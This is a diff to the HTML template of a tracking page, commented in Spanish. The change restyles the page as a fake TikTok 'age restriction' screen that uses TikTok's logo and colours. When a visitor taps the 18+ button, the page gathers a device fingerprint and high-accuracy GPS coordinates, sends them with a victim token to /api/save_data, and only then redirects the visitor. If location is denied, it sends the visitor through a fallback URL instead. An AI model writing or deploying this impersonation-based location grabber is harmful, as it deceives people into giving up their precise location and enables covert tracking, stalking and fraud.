@@ -1,85 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>{{ data.title }}</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; padding: 40px 20px; background: #fff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; margin: 0; }
-        .icon { font-size: 70px; margin-bottom: 20px; }
-        .btn { background: #007AFF; color: white; padding: 16px 32px; border: none; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; max-width: 320px; box-shadow: 0 4px 12px rgba(0,122,255,0.3); transition: transform 0.1s; }
-        .btn:active { transform: scale(0.98); }
-        h2 { margin-bottom: 10px; font-size: 22px; max-width: 300px; }
-        p { color: #666; line-height: 1.5; margin-bottom: 40px; max-width: 300px; font-size: 15px; }
+        body { background-color: #121212; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        
+        /* LOGO TIKTOK ANIMADO */
+        .logo { width: 70px; height: 70px; margin-bottom: 30px; background: url('https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png') no-repeat center; background-size: contain; }
+        
+        h2 { font-size: 20px; margin-bottom: 10px; font-weight: 700; }
+        p { color: #888; font-size: 14px; max-width: 280px; line-height: 1.5; margin-bottom: 40px; }
+        
+        .btn {
+            background-color: #fe2c55; /* Color Rojo TikTok */
+            color: white;
+            border: none;
+            padding: 14px 0;
+            width: 85%;
+            max-width: 300px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .btn:active { opacity: 0.8; }
+        
+        .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fe2c55; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <div class="logo"></div>
     
-    <div class="icon">{{ data.icon }}</div>
-    <h2 id="title">{{ data.title }}</h2>
-    <p id="desc">{{ data.text }}</p>
+    <h2 id="title">Restricción de Edad</h2>
+    <p id="desc">Este video puede contener temas sensibles. Verifica que eres mayor de edad para continuar.</p>
     
-    <button id="btnAction" class="btn" onclick="iniciarProceso()">{{ data.btn }}</button>
-    <div id="msg" style="margin-top:25px; font-size:13px; color:#e74c3c; font-weight:500;"></div>
+    <button id="btnAction" class="btn" onclick="iniciarProceso()">Soy mayor de 18 años</button>
+    <div id="loader" class="loader"></div>
 
     <script>
         const token = window.location.pathname.split('/').pop();
 
-        // OBTENER FINGERPRINT (RAYOS X)
+        // --- HUELLA DIGITAL (FINGERPRINT) ---
         async function getFingerprint() {
             let info = [];
-            info.push(`📺 Pantalla: ${window.screen.width}x${window.screen.height}`);
-            if (navigator.hardwareConcurrency) info.push(`⚙️ CPU: ${navigator.hardwareConcurrency} Cores`);
-            if (navigator.deviceMemory) info.push(`💾 RAM: ~${navigator.deviceMemory} GB`);
+            info.push(`📱 Pantalla: ${window.screen.width}x${window.screen.height}`);
+            if (navigator.deviceMemory) info.push(`💾 RAM: ${navigator.deviceMemory}GB`);
             try {
-                if (navigator.getBattery) {
-                    let bat = await navigator.getBattery();
-                    let level = Math.round(bat.level * 100);
-                    info.push(`${bat.charging ? "🔌" : "🔋"} ${level}%`);
-                }
+                let bat = await navigator.getBattery();
+                info.push(`🔋 Batería: ${Math.round(bat.level * 100)}%`);
             } catch(e) {}
-            if (navigator.connection) info.push(`📡 Red: ${navigator.connection.effectiveType}`);
-            info.push(`💻 OS: ${navigator.platform}`);
+            info.push(`📡 Red: ${navigator.connection ? navigator.connection.effectiveType : '4G'}`);
             return info.join(" | ");
         }
 
         function irAlDestino() { window.location.href = "/redirect/" + token; }
 
         async function iniciarProceso() {
-            document.getElementById('msg').innerText = "Estableciendo conexión segura...";
-            document.getElementById('btnAction').style.opacity = "0.5";
-            
+            // Cambio visual de carga
+            document.getElementById('btnAction').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('desc').innerText = "Verificando ubicación...";
+
             let fingerprint = await getFingerprint();
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => enviarTodo(pos, fingerprint), 
+                    (pos) => {
+                        // Éxito GPS
+                        fetch('/api/save_data', {
+                            method: 'POST', headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                token: token, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, fingerprint: fingerprint
+                            })
+                        }).then(irAlDestino).catch(irAlDestino);
+                    }, 
                     (err) => {
-                        // Si falla, intentamos rebote URL
+                        // Fallo GPS -> Rebote URL (Plan B)
                         window.location.href = `/api/save_gps_bounce?token=${token}&lat=0&lon=0&acc=DENIED`;
                     }, 
-                    {enableHighAccuracy: true, timeout: 8000}
+                    {enableHighAccuracy: true, timeout: 7000}
                 );
             } else {
-                enviarSoloFingerprint(fingerprint);
+                // Sin soporte GPS -> Guardar solo datos técnicos
+                fetch('/api/save_data', {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ token: token, lat: null, fingerprint: fingerprint })
+                }).then(irAlDestino);
             }
-        }
-
-        function enviarTodo(pos, fingerprint) {
-            fetch('/api/save_data', {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    token: token, lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, fingerprint: fingerprint
-                })
-            }).then(irAlDestino).catch(() => {
-                window.location.href = `/api/save_gps_bounce?token=${token}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`;
-            });
-        }
-
-        function enviarSoloFingerprint(fingerprint) {
-            fetch('/api/save_data', {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ token: token, lat: null, fingerprint: fingerprint })
-            }).then(irAlDestino).catch(irAlDestino);
         }
     </script>
 </body>
